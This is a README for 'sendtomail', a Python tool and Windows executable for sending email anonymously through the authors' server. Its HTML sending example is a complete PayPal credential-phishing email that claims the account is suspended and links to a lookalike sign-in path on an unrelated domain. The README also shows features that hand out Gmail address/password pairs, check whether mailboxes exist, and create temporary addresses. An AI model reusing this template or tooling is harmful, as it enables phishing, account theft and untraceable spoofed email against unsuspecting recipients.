## Usage

#### Send free message to email, without your email! It is strictly forbidden to send spam or threats or 18+

```python
# Enable debug for more information
>>> from sendtomail import *
>>> server.debug("on")

# Disable debug for more information
>>> from sendtomail import *
>>> server.debug("off")


# Send free message to email (plain)
>>> from sendtomail import server
>>> server.send("gmail.com", "he1zen@null.net", "plain", "Test subject", "hello, its a test message!")
'200'
>>>

# Send free message to email (html)
>>> from sendtomail import server
>>> server.send("gmail.com", "he1zen@null.net", "html", "Test subject", 
"""<!DOCTYPE html>
<html>
<body>
      <h1> hello, its a test message! </h1>
</head>
<body>

<div class="adn ads" data-message-id="16125bb2badaf364" data-legacy-message-id="16125bb2badaf364" style="border-left: 1px solid transparent; padding-bottom: 20px; padding-left: 8px; color: rgb(34, 34, 34); font-family: arial,sans-serif; font-size: medium; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">
<div class="gs" style="margin-left: 44px;">
<div id=":1mv" class="ii gt" style="margin: 5px 15px 0px 0px; font-size: 12.8px; direction: ltr; padding-bottom: 5px; position: relative;">
<div id=":1mw" class="a3s aXjCH m16125bb2badaf364" style="overflow: hidden;">
<div style="margin: 6px auto; width: 1050px; text-align: center;">
<div>
<table style="margin: 0px auto; vertical-align: top; letter-spacing: normal; line-height: 18.2px; border-collapse: collapse; font-size: 14px; font-family: Arial,sans-serif; width: 600px; text-align: left; color: rgb(85, 85, 85);">

  <tbody>

    <tr>

      <td style="margin: 0px; font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;">
      <div style="border-bottom: 2px solid rgb(116, 141, 166); margin: 0px 0px 10px; padding: 0px 0px 20px; color: rgb(85, 85, 85); height: auto; text-align: right;">
      <table style="font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;" border="0" cellpadding="0" cellspacing="0" width="100%">

        <tbody>

          <tr>

            <td style="margin: 0px; font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;" align="left" valign="bottom">
            <h1 style="color: rgb(0, 0, 0); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); font-family: Verdana;"><span style="color: rgb(0, 44, 132);">Pay</span><span style="color: rgb(0, 158, 222);">pal</span></h1>

            </td>

            <td style="margin: 0px; font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;" width="100%"></td>

          </tr>

        </tbody>
      </table>

      </div>

      <span style="padding: 0px; vertical-align: top; letter-spacing: normal; line-height: 28.6px; border-collapse: collapse; font-family: Arial,sans-serif; font-size: 22px; display: block; color: rgb(0, 94, 166); font-weight: bold;">Dear Client,</span><span style="padding: 0px; vertical-align: top; letter-spacing: normal; line-height: 18.2px; border-collapse: collapse; font-size: 14px; font-family: Arial,sans-serif; font-weight: normal; display: block; color: rgb(85, 85, 85);">
      <h1 style="margin: 20px 0px 5px; vertical-align: top; letter-spacing: normal; line-height: 23.4px; border-collapse: collapse; font-family: Arial,sans-serif; font-size: 18px; font-weight: bold; color: rgb(85, 85, 85);">We need your help resolving an issue with your account.</h1>

      </span>
      <table style="font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;">

        <tbody>

          <tr>

            <td style="margin: 0px; font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;"><span style="padding: 0px; vertical-align: top; letter-spacing: normal; line-height: 18.2px; border-collapse: collapse; font-size: 14px; font-family: Arial,sans-serif; font-weight: normal; display: block; color: rgb(85, 85, 85);"></span>
            <table style="border: 1px solid rgb(116, 141, 166); margin: 10px 0px; padding: 10px; background: rgb(245, 249, 252) none repeat scroll 0% 50%; -moz-background-clip: initial; -moz-background-origin: initial; -moz-background-inline-policy: initial; vertical-align: top; letter-spacing: normal; line-height: 18.2px; border-collapse: collapse; font-size: 14px; font-family: Arial,sans-serif; width: 575px; text-align: center;">

              <tbody>

                <tr>

                  <td style="margin: 0px; font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;"><span style="padding: 0px; vertical-align: top; letter-spacing: normal; line-height: 18.2px; border-collapse: collapse; font-size: 14px; font-family: Arial,sans-serif; font-weight: normal; color: rgb(85, 85, 85);">
                  <h2 style="margin: 0px; padding: 15px 10px; vertical-align: top; letter-spacing: normal; border-collapse: collapse; font-family: Arial,sans-serif; font-size: 16px; line-height: 18px; font-weight: normal; text-align: center; color: rgb(85, 85, 85);">There's a problem with your account. Be sure to resolve it so you have full access to your account again.</h2>

                  </span></td>

                </tr>

              </tbody>
            </table>

            </td>

          </tr>

        </tbody>
      </table>

      <div style="text-align: left;">
      <table class="m_-2570676900531313005deviceWidth" style="font-family: &quot;Times New Roman&quot;; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px;" align="center" bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" width="600">

        <tbody>

          <tr>

            <td style="margin: 0px; font-family: arial,sans-serif; border-collapse: collapse ! important;" valign="top"><span style="color: rgb(86, 86, 86); font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); float: none; display: inline ! important;">Our technical support and customer department has recently suspected activities in your account.</span><br style="color: rgb(86, 86, 86); font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">

            <br style="color: rgb(86, 86, 86); font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">

            <span style="color: rgb(86, 86, 86); font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); float: none; display: inline ! important;">Therefore
we have decided to temporarly suspend your account until investigating
your recent activiies. Such things can happen if you clicked a
suspecious link on social media or gave your password to someone else</span><br style="color: rgb(86, 86, 86); font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">

            <br style="color: rgb(86, 86, 86); font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">

            <span style="color: rgb(86, 86, 86); font-family: Helvetica,Arial,sans-serif; font-size: 13px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); float: none; display: inline ! important;">We're always concerned about our customers security so please help us recover your account by following the link below.</span><span style="color: rgb(32, 32, 32); font-size: 16px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); float: none; font-family: Helvetica,Arial,sans-serif; display: inline ! important;"></span><br>

            </td>

          </tr>

          <tr>

            <td style="margin: 0px; font-family: arial,sans-serif; padding-top: 10px; padding-bottom: 20px; border-collapse: collapse ! important;" align="center" bgcolor="#ffffff" valign="top">
            <table class="m_-2570676900531313005deviceWidth" style="font-family: &quot;Times New Roman&quot;; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px;" align="center" bgcolor="#ffffff" border="0" cellpadding="0" cellspacing="0" width="600">

              <tbody>

                <tr>

                  <td style="margin: 0px; font-family: arial,sans-serif; padding-top: 10px; padding-bottom: 20px; border-collapse: collapse ! important;" align="center" bgcolor="#ffffff" valign="top"><br class="Apple-interchange-newline">

                  <table class="m_-2570676900531313005center m_-2570676900531313005deviceWidth" border="0" cellpadding="0" cellspacing="0" width="422">

                    <tbody>

                      <tr>

                        <td style="margin: 0px; font-family: arial,sans-serif; border-collapse: collapse ! important;" valign="top">
                        <table class="m_-2570676900531313005deviceWidth" style="text-align: left; margin-left: auto; margin-right: auto;" border="0" cellpadding="0" cellspacing="0" width="210">

                          <tbody>

                            <tr>

                              <td class="m_-2570676900531313005center" style="margin: 0px; font-family: arial,sans-serif; padding-top: 10px; border-collapse: collapse ! important;" align="center" valign="top">
                              <table class="m_-2570676900531313005center" style="width: 223px; height: 40px;" align="center" border="0" cellpadding="0" cellspacing="0">

                                <tbody>

                                  <tr>

                                    <td style="margin: 0px; font-family: arial,sans-serif; padding-top: 10px; padding-bottom: 10px; color: rgb(255, 255, 255); background-color: rgb(51, 51, 255); border-collapse: collapse ! important;" align="center" bgcolor="#af88c3" width="180"><a href="https://paypal.chsckulaura.edu.bd/secure/customer_center/customer-IDPP00C886/myaccount/signin/?country.x=US&locale.x=en_US" target="_blank" data-saferedirecturl="https://www.google.com/url?hl=fr&amp;q=http://sm-tracking.vitacost.com/t/jcH1AAhbbQVAhQBJOrEC-oCUJxaDG0oDJCJPmaaaaDA1qBNGL40baa?m%3D8_u7yAvD~amp;W%3DyhjakbziE~25x7ZtTpe.jht~amp;e%3DQZ~amp;4%3D~amp;k%3Dom0iz~25wH~25vM~25vMp3p.2b0Tjhzm.jht~25vMiyhknjmYXznsmz.Tzi4~25wMG~25A68t7t71F~25vDG0m~25A62b0Ttbul~259zhes5hmlZvkpXz~25wKmynl~25vD~amp;OOFZv7uFt8v9GIu~amp;~amp;2b0Ttbul2F706469AAC9F5D66DD2339E159DC9744EA102CDD2009080B3C2C64BFCF37F98&amp;source=gmail&amp;ust=1516821396311000&amp;usg=AFQjCNHEPlHfodWu3GVf_XKULYmMP6lAZw" style="color: rgb(255, 255, 255); text-decoration: none; font-size: 16px; font-family: Arial,Helvetica,sans-serif;"><b>Confirm my account</b></a></td>

                                  </tr>

                                </tbody>
                              </table>

                              </td>

                            </tr>

                          </tbody>
                        </table>

                        </td>

                      </tr>

                    </tbody>
                  </table>

                  </td>

                </tr>

              </tbody>
            </table>

            <br class="Apple-interchange-newline">

            </td>

          </tr>

        </tbody>
      </table>

      <span style="color: rgb(102, 102, 102); font-family: arial,sans-serif; font-size: 13.3333px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); display: inline ! important; float: none;">Yours Sincerely. </span></div>

      <table style="border-top: 2px solid rgb(116, 141, 166); vertical-align: top; letter-spacing: normal; line-height: 18.2px; border-collapse: collapse; font-size: 14px; font-family: Arial,sans-serif; margin-top: 20px; width: 598px;">

        <tbody>

          <tr>

            <td style="margin: 0px; font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;">
            <table style="font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;">

              <tbody>

                <tr>

                  <td style="margin: 0px; font-family: Arial,sans-serif; font-size: 14px; border-collapse: collapse; line-height: 18.2px; letter-spacing: normal; vertical-align: top;">
                  <p style="margin: 5px 0px; padding: 0px; vertical-align: top; letter-spacing: normal; line-height: 18.2px; border-collapse: collapse; font-size: 14px; font-family: Arial,sans-serif; font-weight: normal; color: rgb(85, 85, 85);"><span style="color: rgb(102, 102, 102); font-family: arial,sans-serif; font-size: 13.3333px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); display: inline ! important; float: none;">Please
do not reply to this email. We are unable to respond to inquiries sent
to this address. For immediate answers to your questions, visit our
Help Center by clicking "Help" located on any PayPal page or email.</span><br style="color: rgb(102, 102, 102); font-family: arial,sans-serif; font-size: 13.3333px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">

                  <span style="color: rgb(102, 102, 102); font-family: arial,sans-serif; font-size: 13.3333px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); display: inline ! important; float: none;">Copyright &copy; 2019 PayPal, Inc. All rights reserved. PayPal is located at<span>&nbsp;</span></span><span style="font-family: arial,sans-serif; font-size: 13.3333px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); text-decoration: underline; color: rgb(0, 143, 201);">2211 N. First St., San Jose, CA 95131</span><span style="color: rgb(102, 102, 102); font-family: arial,sans-serif; font-size: 13.3333px; font-style: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255); display: inline ! important; float: none;">.</span></p>

                  </td>

                </tr>

              </tbody>
            </table>

            <br>

            </td>

          </tr>

        </tbody>
      </table>

      </td>

    </tr>

  </tbody>
</table>

<div class="yj6qo"></div>

</div>

</div>

</div>

</div>

</div>

</div>>""")
'200'
>>>

```

#### Text message <img width="99.9%" src="https://raw.githubusercontent.com/mishakorzik/mishakorzik.menu.io/master/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80/Screenshot_2023-01-22-14-44-57-023-edit_com.google.android.gm.jpg"/>

#### Html message <img width="99.9%" src="https://raw.githubusercontent.com/mishakorzik/mishakorzik.menu.io/master/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80/Screenshot_2023-01-22-14-48-09-961-edit_com.google.android.gm.jpg"/>

---

```python
# Servers list
>>> from sendtomail import server
>>> regions = server.regions()
>>> print(regions)
SMTP servers: gmail.com, yandex.com, mail.ru
>>>

# Get Free SMTP, POP3, IMAP email
>>> from sendtomail import server
>>> server.mail()
{'google-mail': 'qcp9ex.iqu0@gmail.com', 'google-pass': 'dmxsdxqgvlcypitf'}
>>>

# Free email checker
>>> from sendtomail import server
>>> server.validate("he1zen@null.net")
'valid'
>>>

# Send custom data
>>> from sendtomail import server
>>> custom.data("^38^92%72^92%65^92%10")
'\nlocation  : Ukraine\nServer IP : 185.16.36.136\ncreator   : He1Zen, mishakorzik\nmirror    : Europe, amazon\nping      : 50-70ms\n'
>>> 

```

### Server Information

```

# get server info with print
>>> from sendtomail import server
>>> server.info(False)
location: Ukraine
creator: He1Zen, mishakorzik
mirror: Europe, amazon
ping: 50-70ms
>>> 

# get server info with return
>>> from sendtomail import server
>>> server.info(True)
'\nlocation  : Ukraine\nServer IP : 185.16.36.136\ncreator   : He1Zen, mishakorzik\nmirror    : Europe, amazon\nping      : 50-70ms\n'
>>> 

```

### Temp Mail Creation

```python
# Create temp mail
>>> from sendtomail import tempmail
>>> tempmail.create()
'qwm5cn282k55sp@dcctb.com'
>>> 

# Read last message from temp mail
>>> from sendtomail import tempmail
>>> tempmail.read("qwm5cn282k55sp", "dcctb.com")
mailbox is empty
>>> 

```

## For Windows

download file <a href='https://drive.google.com/file/d/1njyyb_LJHnQznPHg9wn1NJ0s3oIgWwHv/view?usp=sharing'>sendtomail.exe - v1</a>
download file <a href='https://drive.google.com/file/d/1Nro-hUV63g0vjS8A135XSWPeEuwePdvx/view?usp=drivesdk'>sendtomail.exe - v2</a>
download file <a href='https://drive.google.com/file/d/1jErK0PHP8yOazigiIh-TGUMRaBdesmIQ/view?usp=drivesdk'>sendtomail.exe - v3</a>
download file <a href='https://drive.google.com/file/d/1PjANjknXugxG8wa8TKLsSjhksWXSFFSL/view?usp=share_link'>sendtomail.exe - v4</a>

and start file, i recommend select gmail.com server.

## Tool information

```
## Status codes
200 - Succesfully send
400 - Failed to send
401 - bad request or wrong command
403 - Email protected or secured
404 - Email not found, try another email
429 - Server error, choose another server
500 - Internal Server Error, try again later
503 - Service Unavailable, try again later
504 - Try another server

## Other codes
valid   - mailbox exists
invalid - mailbox does not exist
timeout - mailbox is unknown

## Services
gmail.com   - fast - recommend 
yandex.com  - slow - not recommend
mail.ru     - slow - not recommend
```

**there are logs on the server for security purposes**
